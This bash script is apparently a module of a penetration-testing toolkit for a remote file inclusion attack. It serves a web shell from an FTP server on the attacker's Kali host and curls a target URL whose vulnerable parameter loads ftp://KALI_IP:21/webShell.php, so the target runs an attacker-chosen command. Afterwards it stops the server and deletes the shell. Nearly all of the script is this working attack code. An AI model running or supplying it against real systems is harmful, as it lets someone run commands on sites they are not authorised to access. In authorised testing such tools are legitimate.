#!/bin/bash

: '
Remote RFI with FTP
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
WEBSITE_FIELD=$(form_item "website" "website" "http://domain.com/?lang=")
CMD_FIELD=$(form_item "cmd" "cmd" "whoami")

# Generate GUI form
generate_form "${WEBSITE_FIELD}" "${CMD_FIELD}"

WEBSITE=${form_data["website"]}
CMD=${form_data["cmd"]}

cd "${SCRIPTS_DIR}/web/lfi/.files"
python -m pyftpdlib -p 21 &
FTP_PID=$!

execute_command "curl -ks '${WEBSITE}ftp://${KALI_IP}:21/webShell.php&cmd=${CMD}'"
create_new_line
sleep 60

kill $FTP_PID
rm webShell.php
